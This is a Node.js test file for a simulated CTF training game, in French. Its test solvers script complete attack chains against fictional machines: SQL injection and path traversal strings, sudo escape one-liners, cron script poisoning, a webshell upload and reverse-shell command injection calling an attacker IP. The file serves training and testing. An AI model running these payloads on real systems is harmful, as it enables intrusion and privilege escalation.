#!/usr/bin/env node
// tests/run.js — Suite de tests du moteur CTF Lab (vanilla Node, zéro dépendance).
// Charge machines.js + engine.js dans un contexte vm isolé (avec un faux localStorage),
// puis exécute des scénarios (parsing/pipes, exploit complet par machine, Jeopardy,
// mode Insane) en vérifiant les résultats attendus.
//
// Usage : node tests/run.js   (code de sortie 0 si tout passe, 1 sinon)

const fs = require("fs");
const path = require("path");
const vm = require("vm");

// ── Chargement du moteur dans un contexte isolé ──────────────────────────────
function freshContext() {
  const store = {};
  const localStorage = {
    getItem: (k) => (k in store ? store[k] : null),
    setItem: (k, v) => { store[k] = String(v); },
    removeItem: (k) => { delete store[k]; },
  };
  const toasts = [];
  const context = { localStorage, toast: (m) => toasts.push(m), console, toasts };
  vm.createContext(context);
  const code =
    fs.readFileSync(path.join(__dirname, "../js/machines.js"), "utf8") + "\n" +
    fs.readFileSync(path.join(__dirname, "../js/engine.js"), "utf8");
  vm.runInContext(code, context, { filename: "engine-under-test.js" });
  vm.runInContext("resetSessionToAttacker();", context);
  return context;
}

function run(ctx, cmd) {
  return vm.runInContext(`runCommand(${JSON.stringify(cmd)})`, ctx);
}
function pass(ctx, pwd) {
  return vm.runInContext(`tryPassword(${JSON.stringify(pwd)})`, ctx);
}
function get(ctx, expr) {
  return vm.runInContext(expr, ctx);
}
function unlockAll(ctx) {
  vm.runInContext("GAME.unlocked = MACHINES.map(m => m.id);", ctx);
}

// ── Mini framework de test ───────────────────────────────────────────────────
let passed = 0, failed = 0;
const failures = [];
function assert(cond, msg) {
  if (cond) { passed++; }
  else { failed++; failures.push(msg); console.log(`  ✗ ${msg}`); }
}
function assertEqual(actual, expected, msg) {
  assert(actual === expected, `${msg} (attendu: ${JSON.stringify(expected)}, obtenu: ${JSON.stringify(actual)})`);
}
function section(title, fn) {
  console.log(`\n▶ ${title}`);
  const result = fn();
  if (result && typeof result.then === "function") pendingAsync.push(result);
}
const pendingAsync = [];

// ── 1. Parsing / pipes ───────────────────────────────────────────────────────
section("Parsing & pipes", () => {
  const ctx = freshContext();
  const r1 = run(ctx, "echo hello world");
  assertEqual(r1.text, "hello world", "echo simple");

  run(ctx, "use nimbus");
  run(ctx, "nmap 10.10.11.21");
  const r2 = run(ctx, "nmap 10.10.11.21 | grep ssh");
  assert(/ssh/.test(r2.text) && !/ftp/.test(r2.text), "grep filtre bien les lignes (ssh sans ftp)");

  const r3 = run(ctx, "nmap 10.10.11.21 | wc -l");
  assert(/^\d+$/.test(r3.text.trim()), "wc -l retourne un nombre");

  const r4 = run(ctx, "echo 'b\na\nc' | sort");
  assertEqual(r4.text, "a\nb\nc", "sort trie les lignes");

  const r5 = run(ctx, "echo 'a:b:c' | cut -d ':' -f 2");
  assertEqual(r5.text, "b", "cut extrait le bon champ");

  const r6 = run(ctx, "echo 'un deux trois' | awk '{print $2}'");
  assertEqual(r6.text, "deux", "awk extrait le bon mot");

  const r7 = run(ctx, "echo '1\n2\n3\n4\n5' | head -2");
  assertEqual(r7.text, "1\n2", "head -2 garde les 2 premières lignes");

  const r8 = run(ctx, "echo '1\n2\n3\n4\n5' | tail -2");
  assertEqual(r8.text, "4\n5", "tail -2 garde les 2 dernières lignes");

  const rBad = run(ctx, "flibbertigibbet");
  assert(rBad.cls === "t-err" && /command not found/.test(rBad.text), "commande inconnue -> bash: ... command not found");
});

// ── 2. Chaque machine : exploit complet, flags, score, badge ────────────────
const MACHINE_SOLUTIONS = {
  nimbus: (ctx) => {
    run(ctx, "nmap 10.10.11.21");
    run(ctx, "curl http://10.10.11.21/");
    run(ctx, "ftp 10.10.11.21");
    run(ctx, "cat ~/loot/nimbus-ftp/backup_users.txt");
    run(ctx, "ssh jsmith@10.10.11.21");
    pass(ctx, "N1mbus_B4ckup!2024");
    run(ctx, "cat user.txt");
    run(ctx, "sudo -l");
    run(ctx, "sudo /usr/bin/less /var/log/nginx/access.log");
    run(ctx, "!sh");
    return run(ctx, "cat /root/root.txt");
  },
  vortex: (ctx) => {
    run(ctx, "nmap 10.10.11.15");
    run(ctx, "curl http://10.10.11.15/");
    run(ctx, "curl http://10.10.11.15/api/docs");
    run(ctx, "curl http://10.10.11.15/api/users/1");
    run(ctx, "curl http://10.10.11.15/api/users/2");
    run(ctx, "ssh kwright@10.10.11.15");
    pass(ctx, "V0rt3x_Adm1n!77");
    run(ctx, "cat user.txt");
    run(ctx, "sudo -l");
    run(ctx, "sudo man man");
    run(ctx, "!sh");
    return run(ctx, "cat /root/root.txt");
  },
  cerberus: (ctx) => {
    run(ctx, "nmap 10.10.11.42");
    run(ctx, "curl http://10.10.11.42/robots.txt");
    run(ctx, "curl http://10.10.11.42/.env");
    run(ctx, "ssh mdurand@10.10.11.42 -p 2222");
    pass(ctx, "Cerb3r0s_2024!");
    run(ctx, "cat user.txt");
    run(ctx, "sudo -l");
    run(ctx, "echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh");
    run(ctx, "whoami"); // laisse tourner le cron (tick au prochain runCommand)
    run(ctx, "bash -p");
    return run(ctx, "cat /root/root.txt");
  },
  obsidian: (ctx) => {
    run(ctx, "nmap 10.10.11.77");
    run(ctx, "curl http://10.10.11.77:8000/");
    run(ctx, "curl http://10.10.11.77:8000/old/site-backup.txt");
    run(ctx, "ssh tvasquez@10.10.11.77");
    pass(ctx, "0bs1d1an_D3ploy#99");
    run(ctx, "cat user.txt");
    run(ctx, "sudo -l");
    run(ctx, "find / -perm -4000 -type f 2>/dev/null");
    run(ctx, "find . -exec /bin/sh -p \\; -quit");
    return run(ctx, "cat /root/root.txt");
  },
  phantom: (ctx) => {
    run(ctx, "nmap 10.10.11.58");
    run(ctx, "curl http://10.10.11.58/");
    run(ctx, "curl \"http://10.10.11.58/index.php?page=../../../../var/www/html/config.php.bak\"");
    run(ctx, "curl -d \"user=broland&pass=' OR '1'='1' -- -\" http://10.10.11.58/admin/login.php");
    run(ctx, "ssh broland@10.10.11.58");
    pass(ctx, "Ph4nt0m_SQL1_2024!");
    run(ctx, "cat user.txt");
    run(ctx, "sudo -l");
    run(ctx, "sudo awk 'BEGIN {system(\"/bin/sh\")}'");
    return run(ctx, "cat /root/root.txt");
  },
  meridian: (ctx) => {
    run(ctx, "nmap 10.10.11.101");
    run(ctx, "curl http://10.10.11.101:8080/");
    run(ctx, "curl \"http://10.10.11.101:8080/report?file=../../../../etc/meridian/config.bak\"");
    run(ctx, "ssh npatel@10.10.11.101");
    pass(ctx, "M3r1d1an_Ops#41");
    run(ctx, "cat user.txt");
    run(ctx, "sudo -l");
    run(ctx, "sudo python3 -c 'import os; os.system(\"/bin/sh\")'");
    return run(ctx, "cat /root/root.txt");
  },
  glacier: (ctx) => {
    run(ctx, "nmap 10.10.11.230");
    run(ctx, "ftp 10.10.11.230");
    run(ctx, "cat ~/loot/glacier-ftp/svc_notes.txt");
    run(ctx, "ssh svc_backup@10.10.11.230");
    pass(ctx, "B4ckup_Serv1ce#22");
    run(ctx, "type user.txt");
    run(ctx, "schtasks /query");
    run(ctx, "icacls C:\\Scripts\\backup.bat");
    run(ctx, "echo copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\Temp\\svc.exe >> C:\\Scripts\\backup.bat");
    run(ctx, "whoami"); // laisse tourner la tâche planifiée
    run(ctx, "C:\\Windows\\Temp\\svc.exe");
    return run(ctx, "type root.txt");
  },
  stratus: (ctx) => {
    run(ctx, "nmap 10.10.11.120");
    run(ctx, "curl http://10.10.11.120/");
    run(ctx, "cloudctl ls");
    run(ctx, "cloudctl ls s3://stratus-prod-backups");
    run(ctx, "cloudctl get s3://stratus-prod-backups/deploy.env");
    run(ctx, "ssh dsomma@10.10.11.120");
    pass(ctx, "Str4tus_D3ploy!23");
    run(ctx, "cat user.txt");
    run(ctx, "sudo -l");
    run(ctx, "sudo env /bin/sh");
    return run(ctx, "cat /root/root.txt");
  },
  nexus: (ctx) => {
    run(ctx, "exit"); // pour attraper une reverse shell, il faut être sur sa propre box
    run(ctx, "nmap 10.10.11.135");
    run(ctx, "curl http://10.10.11.135/");
    run(ctx, "curl http://10.10.11.135/upload.php");
    run(ctx, 'curl -F "file=@shell.php" http://10.10.11.135/upload.php');
    run(ctx, "nc -lvnp 4444");
    run(ctx, 'curl "http://10.10.11.135/uploads/sh.php?cmd=nc 10.10.14.1 4444 -e /bin/sh"');
    run(ctx, "cat user.txt");
    run(ctx, "sudo -l");
    run(ctx, "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh");
    return run(ctx, "cat /root/root.txt");
  },
  citadel: (ctx) => {
    // Pivot : nécessite NEXUS déjà rooté (fait plus tôt dans la boucle des machines).
    run(ctx, "ssh -L 9022:172.16.20.10:22 root@10.10.11.135");
    run(ctx, "nmap 172.16.20.10");
    run(ctx, "ssh dbadmin@172.16.20.10");
    pass(ctx, "C1tad3l_Db#77");
    run(ctx, "cat user.txt");
    run(ctx, "sudo -l");
    run(ctx, "sudo perl -e 'exec \"/bin/sh\";'");
    return run(ctx, "cat /root/root.txt");
  },
  tempest: (ctx) => {
    run(ctx, "exit"); // pour attraper le callback, être sur sa propre box
    run(ctx, "nmap 10.10.11.150");
    run(ctx, "curl http://10.10.11.150:8080/");
    run(ctx, "cloudctl ls");
    run(ctx, "cloudctl get s3://tempest-artifacts/build.log");
    run(ctx, "nc -lvnp 4444");
    run(ctx, "cloudctl cp reverse.sh s3://tempest-deploy/");
    run(ctx, "cat user.txt");
    run(ctx, "sudo -l");
    run(ctx, "sudo nmap --interactive");
    run(ctx, "!sh");
    return run(ctx, "cat /root/root.txt");
  },
  axiom: (ctx) => {
    run(ctx, "nmap 10.10.11.244");
    run(ctx, "curl http://10.10.11.244:8080/");
    run(ctx, "curl http://10.10.11.244:8080/logs/latest.txt");
    run(ctx, "ssh cibuild@10.10.11.244");
    pass(ctx, "Ax1om_CI_Runner#88");
    run(ctx, "cat user.txt");
    run(ctx, "sudo -l");
    run(ctx, "id");
    run(ctx, "docker ps");
    run(ctx, "docker run -v /:/mnt --rm -it alpine chroot /mnt sh");
    return run(ctx, "cat /root/root.txt");
  },
};

section("Machines : recon -> accès -> privesc -> flags (les 8 machines)", () => {
  const ctx = freshContext();
  unlockAll(ctx);
  const machines = get(ctx, "MACHINES");
  assertEqual(machines.length, 12, "12 machines définies dans MACHINES");

  let totalScoreCheck = 0;
  for (const m of machines) {
    run(ctx, `use ${m.id}`);
    const solver = MACHINE_SOLUTIONS[m.id];
    assert(!!solver, `une solution de test existe pour ${m.id}`);
    if (!solver) continue;
    const last = solver(ctx);
    assert(last && last.cls !== "t-err", `${m.id} : dernière étape sans erreur (${last && last.text && last.text.slice(0, 60)})`);
    const p = get(ctx, `GAME.progress.${m.id}`);
    assert(p.recon && p.access && p.privesc && p.userFlag && p.rootFlag, `${m.id} : recon+accès+privesc+2 flags tous validés`);
  }

  const finalScore = get(ctx, "GAME.score");
  // 12 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 12 * 800 = 9600
  assertEqual(finalScore, 9600, "score total cohérent après les 12 machines (100+150+250+100+200 par machine)");

  const badges = get(ctx, "GAME.badges");
  assert(badges["completionist"] === true, "badge 🌐 tour complet débloqué après les 8 machines");
});

section("Lore transversal : note_interne.txt présent sur chaque machine sans fausser le score", () => {
  const ctx = freshContext();
  unlockAll(ctx);
  const machines = get(ctx, "MACHINES");
  for (const m of machines) {
    run(ctx, `use ${m.id}`);
    const solver = MACHINE_SOLUTIONS[m.id];
    if (!solver) continue;
    solver(ctx);
    const scoreBefore = get(ctx, "GAME.score");
    const lore = run(ctx, "cat ~/note_interne.txt");
    assert(lore.cls !== "t-err", `${m.id} : note_interne.txt est bien présent et lisible`);
    assert(!/FLAG\{/.test(lore.text), `${m.id} : note_interne.txt ne contient pas de flag (pur easter egg narratif)`);
    assertEqual(get(ctx, "GAME.score"), scoreBefore, `${m.id} : lire la note narrative ne modifie pas le score`);
  }
});

// ── 3. reset <machine> rembourse exactement les points gagnés ───────────────
section("reset rembourse les points gagnés sur une machine", () => {
  const ctx = freshContext();
  unlockAll(ctx);
  run(ctx, "use nimbus");
  MACHINE_SOLUTIONS.nimbus(ctx);
  const before = get(ctx, "GAME.score");
  assert(before > 0, "score > 0 après avoir terminé nimbus");
  run(ctx, "reset nimbus");
  const after = get(ctx, "GAME.score");
  assertEqual(after, 0, "reset nimbus ramène le score à 0 (seule machine jouée)");
  const p = get(ctx, "GAME.progress.nimbus");
  assert(!p.recon && !p.access && !p.privesc && !p.userFlag && !p.rootFlag, "reset nimbus efface bien toute la progression");
});

// ── 4. Mode Jeopardy : chaque défi accepte sa bonne réponse, refuse une mauvaise ─
section("Mode Jeopardy : tous les défis sont résolubles", () => {
  const ctx = freshContext();
  const challenges = get(ctx, "CHALLENGES");
  assert(challenges.length >= 6, `au moins 6 défis Jeopardy définis (trouvé ${challenges.length})`);

  for (const c of challenges) {
    const wrong = run(ctx, `submit ${c.id} FLAG{mauvaise_reponse}`);
    assert(wrong.cls === "t-err", `${c.id} : une mauvaise réponse est rejetée`);
    const right = run(ctx, `submit ${c.id} ${c.answer}`);
    assert(right.cls !== "t-err", `${c.id} : la bonne réponse (${c.answer}) est acceptée`);
    assertEqual(get(ctx, `GAME.jeopardy.solved.${c.id}`), true, `${c.id} : marqué comme résolu`);
  }

  const badges = get(ctx, "GAME.badges");
  assertEqual(badges["jeopardy_complete"], true, "badge Jeopardy complet débloqué après tous les défis");
});

// ── 5. hashcat (challenge hashcrack) et RSA toy sont cohérents avec leur flag ─
section("hashcat retrouve bien le mot de passe attendu", () => {
  const ctx = freshContext();
  const c = get(ctx, "CHALLENGES").find((cc) => cc.id === "hashcrack");
  const shown = run(ctx, `challenge ${c.id}`);
  const hashMatch = shown.text.match(/[0-9a-f]{8,}/i);
  assert(!!hashMatch, "l'énoncé du défi hashcrack contient bien un hash-VX à casser");
  if (hashMatch) {
    const cracked = run(ctx, `hashcat ${hashMatch[0]}`);
    assert(cracked.cls !== "t-err", "hashcat retrouve une correspondance dans la wordlist embarquée");
  }
});

// ── 6. Mode Insane : bloque les indices, multiplie le score, verrouillé hors partie neuve ─
section("Mode Insane", () => {
  const ctx = freshContext();
  unlockAll(ctx);

  const onFresh = run(ctx, "insane on");
  assert(onFresh.cls !== "t-err", "insane on fonctionne sur une sauvegarde neuve");
  assertEqual(get(ctx, "GAME.insaneMode"), true, "GAME.insaneMode passe à true");

  run(ctx, "use nimbus");
  const hinted = run(ctx, "hint");
  assert(hinted.cls === "t-err", "hint est bloqué en mode Insane");

  run(ctx, "nmap 10.10.11.21");
  assertEqual(get(ctx, "GAME.score"), 150, "le score de recon (100) est multiplié par 1.5 en mode Insane");

  const offMidGame = run(ctx, "insane off");
  assert(offMidGame.cls === "t-err", "insane off refusé en cours de partie (score != 0)");

  run(ctx, "reset nimbus");
  const offAfterReset = run(ctx, "insane off");
  assert(offAfterReset.cls !== "t-err", "insane off fonctionne à nouveau une fois la partie redevenue neuve");
  assertEqual(get(ctx, "GAME.insaneMode"), false, "GAME.insaneMode repasse à false");
});

// ── 7. Chiffrement export/import (logique AES-GCM/PBKDF2, dupliquée depuis app.js) ──
// app.js pilote le DOM (file picker, téléchargement) donc n'est pas testable ici directement ;
// ce test vérifie que l'algorithme choisi (PBKDF2-SHA256 -> AES-GCM) fait un aller-retour correct
// et rejette bien une mauvaise passphrase, avec l'implémentation Web Crypto native de Node.
section("Chiffrement export/import (AES-GCM + PBKDF2, round-trip)", () => {
  const { webcrypto } = require("crypto");
  const subtle = webcrypto.subtle;

  function bufToB64(buf) { return Buffer.from(buf).toString("base64"); }
  function b64ToBuf(b64) { return new Uint8Array(Buffer.from(b64, "base64")); }
  async function deriveKey(passphrase, salt, usages) {
    const enc = new TextEncoder();
    const keyMaterial = await subtle.importKey("raw", enc.encode(passphrase), "PBKDF2", false, ["deriveKey"]);
    return subtle.deriveKey({ name: "PBKDF2", salt, iterations: 150000, hash: "SHA-256" }, keyMaterial, { name: "AES-GCM", length: 256 }, false, usages);
  }
  async function encrypt(plaintext, passphrase) {
    const salt = webcrypto.getRandomValues(new Uint8Array(16));
    const iv = webcrypto.getRandomValues(new Uint8Array(12));
    const key = await deriveKey(passphrase, salt, ["encrypt"]);
    const ciphertext = await subtle.encrypt({ name: "AES-GCM", iv }, key, new TextEncoder().encode(plaintext));
    return { format: "ctf-lab-save", v: 1, salt: bufToB64(salt), iv: bufToB64(iv), data: bufToB64(ciphertext) };
  }
  async function decrypt(envelope, passphrase) {
    const key = await deriveKey(passphrase, b64ToBuf(envelope.salt), ["decrypt"]);
    const plainBuf = await subtle.decrypt({ name: "AES-GCM", iv: b64ToBuf(envelope.iv) }, key, b64ToBuf(envelope.data));
    return new TextDecoder().decode(plainBuf);
  }

  return (async () => {
    const original = JSON.stringify({ score: 1234, insaneMode: true, note: "état de partie factice" });
    const envelope = await encrypt(original, "correct-horse-battery-staple");
    assert(envelope.format === "ctf-lab-save", "l'enveloppe chiffrée a le bon format");

    const decrypted = await decrypt(envelope, "correct-horse-battery-staple");
    assertEqual(decrypted, original, "le déchiffrement avec la bonne passphrase restaure exactement le JSON d'origine");

    let wrongPassphraseFailed = false;
    try { await decrypt(envelope, "mauvaise-passphrase"); } catch (e) { wrongPassphraseFailed = true; }
    assert(wrongPassphraseFailed, "le déchiffrement avec une mauvaise passphrase échoue (tag d'authentification AES-GCM)");
  })();
});

// ── 8. vim minimal : édition de fichier, et alternative à echo pour le privesc cron ──
section("vim : éditeur minimal", () => {
  const ctx = freshContext();
  unlockAll(ctx);

  // Création + édition d'un fichier local côté attaquant
  const open1 = run(ctx, "vim ~/notes-perso.txt");
  assert(open1.cls !== "t-err", "vim ouvre un nouveau fichier sans erreur");
  run(ctx, "premiere ligne");
  run(ctx, "deuxieme ligne");
  const saved = run(ctx, ":wq");
  assert(saved.cls === "t-ok", "vim :wq confirme l'enregistrement");
  const catBack = run(ctx, "cat ~/notes-perso.txt");
  assertEqual(catBack.text, "premiere ligne\ndeuxieme ligne", "le contenu écrit via vim est bien relu avec cat");

  // :q! n'enregistre rien
  run(ctx, "vim ~/abandon.txt");
  run(ctx, "ce texte ne doit pas être sauvé");
  run(ctx, ":q!");
  const catAbandon = run(ctx, "cat ~/abandon.txt");
  assert(catAbandon.cls === "t-err", "vim :q! n'a rien enregistré, le fichier n'existe pas");

  // vim comme alternative à `echo >>` pour piéger le script cron de cerberus
  run(ctx, "use cerberus");
  run(ctx, "nmap 10.10.11.42");
  run(ctx, "curl http://10.10.11.42/robots.txt");
  run(ctx, "curl http://10.10.11.42/.env");
  run(ctx, "ssh mdurand@10.10.11.42 -p 2222");
  pass(ctx, "Cerb3r0s_2024!");
  run(ctx, "cat user.txt");
  run(ctx, "sudo -l");
  run(ctx, "vim /opt/scripts/backup.sh");
  run(ctx, "#!/bin/bash");
  run(ctx, "# sauvegarde quotidienne");
  run(ctx, "tar -czf /var/backups/data.tar.gz /srv/data");
  run(ctx, "chmod +s /bin/bash");
  run(ctx, ":wq");
  run(ctx, "whoami"); // laisse tourner le cron (tick au prochain runCommand)
  const rooted = run(ctx, "bash -p");
  assert(rooted.cls !== "t-err", "vim peut planter la charge utile cron tout comme echo >>, bash -p réussit");
  const rootFlag = run(ctx, "cat /root/root.txt");
  assert(/FLAG\{cerberus_root/.test(rootFlag.text), "root.txt de cerberus est bien récupérable après un privesc piégé via vim");
});

// ── 9. nc : bannière brute sur un port ouvert, refus sur port fermé/machine verrouillée ──
section("nc : connexion bannière", () => {
  const ctx = freshContext();
  const usage = run(ctx, "nc");
  assert(usage.cls === "t-err", "nc sans arguments renvoie une erreur d'usage");

  const locked = run(ctx, "nc 10.10.11.42 80"); // cerberus, pas encore débloquée
  assert(locked.cls === "t-err", "nc refuse une machine encore verrouillée");

  unlockAll(ctx);
  const closed = run(ctx, "nc 10.10.11.21 4444");
  assert(closed.cls === "t-err", "nc refuse un port fermé");

  const opened = run(ctx, "nc 10.10.11.21 22");
  assert(opened.cls !== "t-err" && /OpenSSH/.test(opened.text), "nc affiche la bannière d'un port ouvert (ssh sur nimbus)");
});

// ── 10. Validation de schéma des machines (premier pas vers du JSON déclaratif) ──
section("validateMachines : garde-fou de schéma", () => {
  const ctx = freshContext();
  const cleanErrors = get(ctx, "validateMachines(MACHINES)");
  assertEqual(cleanErrors.length, 0, `les 8 machines réelles ne remontent aucune erreur de schéma (obtenu : ${JSON.stringify(cleanErrors)})`);

  const broken = get(ctx, `
    (() => {
      const clone = JSON.parse(JSON.stringify(MACHINES));
      delete clone[0].ip;
      clone[1].id = clone[2].id; // doublon d'id volontaire
      clone[3].privesc.type = "totally-invalid-type";
      return validateMachines(clone);
    })()
  `);
  assert(broken.length >= 3, `une machine volontairement cassée (ip manquante, id en doublon, privesc.type invalide) remonte bien plusieurs erreurs (obtenu ${broken.length})`);
});

// ── 11. Reverse shell manuel (nc -lvnp + injection de commande) sur MERIDIAN ──
section("nc -lvnp : reverse shell manuel comme chemin alternatif", () => {
  const ctx = freshContext();
  unlockAll(ctx);
  run(ctx, "use meridian");
  run(ctx, "nmap 10.10.11.101");
  run(ctx, "curl http://10.10.11.101:8080/");

  const noListener = run(ctx, "curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh\"");
  assert(noListener.cls === "t-err", "sans écoute au préalable, la requête ne donne rien");
  assertEqual(get(ctx, "GAME.progress.meridian.access"), false, "aucun accès accordé sans nc -lvnp au bon port");

  const wrongPort = run(ctx, "nc -lvnp 1234");
  assert(wrongPort.cls !== "t-err", "nc -lvnp démarre bien l'écoute");
  const stillNoAccess = run(ctx, "curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh\"");
  assert(stillNoAccess.cls === "t-err", "écoute sur le mauvais port -> toujours pas d'accès");

  // Mécanisme généralisé : le port est parsé depuis le payload, pas câblé en dur.
  // On prouve qu'un port non standard (9001) fonctionne tant que l'écoute correspond.
  run(ctx, "nc -lvnp 9001");
  const badIp = run(ctx, "curl \"http://10.10.11.101:8080/report?file=report.txt;nc 9.9.9.9 9001 -e /bin/sh\"");
  assert(badIp.cls === "t-err", "un callback vers une IP qui n'est pas l'attaquant est refusé");
  assertEqual(get(ctx, "GAME.progress.meridian.access"), false, "mauvaise IP de callback -> pas d'accès");

  const shell = run(ctx, "curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 9001 -e /bin/sh\"");
  assert(shell.cls !== "t-err", "écoute sur un port variable (9001) + bon IP -> connexion reçue");
  assertEqual(get(ctx, "GAME.progress.meridian.access"), true, "l'accès initial est bien marqué via le chemin reverse shell");
  assertEqual(get(ctx, "SESSION.ctx"), "meridian", "la session bascule bien sur meridian après la reverse shell");
  assertEqual(get(ctx, "SESSION.user"), "npatel", "la reverse shell atterrit avec le même utilisateur que ssh (simplification assumée)");

  const flag = run(ctx, "cat user.txt");
  assert(/FLAG\{meridian_acces_initial/.test(flag.text), "le flag utilisateur reste accessible après un accès obtenu par reverse shell");

  // Le score d'accès n'est crédité qu'une fois, même en repassant par le chemin ssh ensuite
  const scoreAfterShell = get(ctx, "GAME.score");
  run(ctx, "exit");
  run(ctx, "ssh npatel@10.10.11.101");
  pass(ctx, "M3r1d1an_Ops#41");
  assertEqual(get(ctx, "GAME.score"), scoreAfterShell, "repasser par ssh après la reverse shell ne recrédite pas les points d'accès");
});

// ── 11bis. Reverse shell généralisé : même mécanisme réutilisé sur PHANTOM ────
section("Reverse shell généralisé : altAccess réutilisable (PHANTOM)", () => {
  const ctx = freshContext();
  unlockAll(ctx);
  run(ctx, "use phantom");

  // La LFI normale (?page=...) ne doit PAS être prise pour une injection de commande.
  const lfi = run(ctx, "curl \"http://10.10.11.58/index.php?page=../../../../var/www/html/config.php.bak\"");
  assert(/config\.php\.bak/.test(lfi.text) && lfi.cls !== "t-err", "la LFI classique reste servie normalement (pas confondue avec une injection)");
  assertEqual(get(ctx, "GAME.progress.phantom.access"), false, "lire un fichier via ?page= ne donne pas d'accès shell");

  // Injection de commande sans écoute -> rien.
  const noListen = run(ctx, "curl \"http://10.10.11.58/index.php?page=fr.html;nc 10.10.14.1 5555 -e /bin/sh\"");
  assert(noListen.cls === "t-err", "injection sans écoute préalable -> pas d'accès");

  // Écoute sur un port libre puis déclenchement -> accès obtenu, même code moteur que MERIDIAN.
  run(ctx, "nc -lvnp 5555");
  const shell = run(ctx, "curl \"http://10.10.11.58/index.php?page=fr.html;nc 10.10.14.1 5555 -e /bin/sh\"");
  assert(shell.cls !== "t-err", "écoute + injection -> connexion reçue sur phantom");
  assertEqual(get(ctx, "GAME.progress.phantom.access"), true, "accès initial marqué sur phantom via reverse shell");
  assertEqual(get(ctx, "SESSION.ctx"), "phantom", "la session bascule bien sur phantom");
  assertEqual(get(ctx, "SESSION.user"), "broland", "la reverse shell phantom atterrit sur le bon utilisateur");
  const flag = run(ctx, "cat user.txt");
  assert(/FLAG\{phantom_acces_initial/.test(flag.text), "le flag utilisateur phantom est accessible après le reverse shell");
});

// ── 12. Machine cloud (STRATUS) : bucket public via cloudctl ─────────────────
section("Cloud mal configuré : cloudctl + bucket public (STRATUS)", () => {
  const ctx = freshContext();
  unlockAll(ctx);
  run(ctx, "use stratus");
  const ls = run(ctx, "cloudctl ls");
  assert(/PUBLIC\s+s3:\/\/stratus-prod-backups/.test(ls.text), "cloudctl ls signale le bucket public");
  const priv = run(ctx, "cloudctl ls s3://stratus-internal-keys");
  assert(priv.cls === "t-err" && /AccessDenied/.test(priv.text), "un bucket privé refuse le listing (AccessDenied)");
  const leak = run(ctx, "cloudctl get s3://stratus-prod-backups/deploy.env");
  assert(/SSH_PASS=Str4tus_D3ploy!23/.test(leak.text), "cloudctl get lit le fichier du bucket public et fuite les creds");
  const denied = run(ctx, "cloudctl get s3://stratus-internal-keys/id_rsa");
  assert(denied.cls === "t-err", "cloudctl get refuse un objet d'un bucket privé");
});

// ── 13. Webshell upload (NEXUS) : curl -F + reverse shell gated par l'upload ──
section("Upload de webshell : curl -F puis reverse shell (NEXUS)", () => {
  const ctx = freshContext();
  unlockAll(ctx);
  run(ctx, "use nexus");
  run(ctx, "nmap 10.10.11.135");

  // Sans upload préalable, le webshell n'existe pas encore (404).
  run(ctx, "nc -lvnp 4444");
  const before = run(ctx, 'curl "http://10.10.11.135/uploads/sh.php?cmd=nc 10.10.14.1 4444 -e /bin/sh"');
  assert(before.cls === "t-err" && /404/.test(before.text), "sans upload, le chemin du webshell renvoie 404");
  assertEqual(get(ctx, "GAME.progress.nexus.access"), false, "pas d'accès tant que le webshell n'est pas uploadé");

  // Un fichier non autorisé est refusé, un .php déguisé passe.
  const badFile = run(ctx, 'curl -F "file=@photo.jpg" http://10.10.11.135/upload.php');
  assert(badFile.cls === "t-err", "un fichier non-php est refusé par le (faux) filtre");
  const upload = run(ctx, 'curl -F "file=@shell.php" http://10.10.11.135/upload.php');
  assert(upload.cls !== "t-err" && /uploads\/sh\.php/.test(upload.text), "l'upload d'un .php est accepté et révèle le chemin");

  // Maintenant le webshell déclenche bien la reverse shell (écoute déjà active).
  const shell = run(ctx, 'curl "http://10.10.11.135/uploads/sh.php?cmd=nc 10.10.14.1 4444 -e /bin/sh"');
  assert(shell.cls !== "t-err", "après upload + écoute, le webshell ouvre la reverse shell");
  assertEqual(get(ctx, "GAME.progress.nexus.access"), true, "accès www-data obtenu via le webshell");
  assertEqual(get(ctx, "SESSION.user"), "www-data", "la reverse shell atterrit en www-data");
  const flag = run(ctx, "cat user.txt");
  assert(/FLAG\{nexus_acces_initial/.test(flag.text), "le flag utilisateur NEXUS est lisible après le webshell");
});

// ── 14. Pivot (CITADEL) : hôte interne joignable seulement via ssh -L ────────
section("Pivot multi-hop : hôte interne via tunnel ssh -L (CITADEL)", () => {
  const ctx = freshContext();
  unlockAll(ctx);

  // Directement, l'hôte interne est injoignable.
  const noRoute = run(ctx, "nmap 172.16.20.10");
  assert(noRoute.cls === "t-err" && /interne/.test(noRoute.text), "l'hôte interne n'est pas routable directement");

  // Le tunnel exige que le pivot (NEXUS) soit rooté.
  const noPivot = run(ctx, "ssh -L 9022:172.16.20.10:22 root@10.10.11.135");
  assert(noPivot.cls === "t-err" && /root/.test(noPivot.text), "impossible d'ouvrir le tunnel tant que NEXUS n'est pas rooté");

  // On roote NEXUS, puis le tunnel s'ouvre et l'hôte interne devient joignable.
  run(ctx, "use nexus");
  MACHINE_SOLUTIONS.nexus(ctx);
  assertEqual(get(ctx, "GAME.progress.nexus.rootFlag"), true, "NEXUS rooté (prérequis du pivot)");
  const tunnel = run(ctx, "ssh -L 9022:172.16.20.10:22 root@10.10.11.135");
  assert(tunnel.cls !== "t-err" && /Tunnel SSH établi/.test(tunnel.text), "tunnel établi une fois NEXUS rooté");
  const scan = run(ctx, "nmap 172.16.20.10");
  assert(scan.cls !== "t-err" && /citadel/i.test(scan.text), "l'hôte interne est scannable à travers le tunnel");

  // Accès + privesc complets sur l'hôte interne.
  run(ctx, "ssh dbadmin@172.16.20.10");
  pass(ctx, "C1tad3l_Db#77");
  assertEqual(get(ctx, "SESSION.ctx"), "citadel", "accès obtenu sur l'hôte interne");
  run(ctx, "sudo perl -e 'exec \"/bin/sh\";'");
  const flag = run(ctx, "cat /root/root.txt");
  assert(/FLAG\{citadel_root/.test(flag.text), "flag root CITADEL capturé après pivot + privesc");
});

// ── 14bis. Cloud writable : cloudctl cp -> RCE via pipeline (TEMPEST) ─────────
section("Cloud inscriptible : cloudctl cp -> RCE (TEMPEST)", () => {
  const ctx = freshContext();
  unlockAll(ctx);
  run(ctx, "use tempest");
  run(ctx, "nmap 10.10.11.150");

  // Un bucket en lecture seule refuse l'écriture.
